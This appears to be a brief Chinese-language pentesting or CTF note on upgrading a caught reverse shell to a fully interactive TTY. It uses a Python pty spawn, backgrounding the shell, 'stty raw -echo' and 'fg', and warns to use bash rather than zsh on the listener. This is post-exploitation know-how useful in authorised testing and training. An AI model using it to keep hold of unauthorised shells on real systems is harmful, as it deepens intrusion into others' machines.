再次加固shell

获取完整shell：
1、 python -c 'import pty;pty.spawn("/bin/bash")'
2、ctrl+z后台化shell
3、stty raw -echo
4、输入fg+回车
此时shell就可以使用各种按键而不会乱码了，ctrl+c也不会断开
注意：此过程需确保在监听端口前就使用着bash shell，而非默认的zsh shell
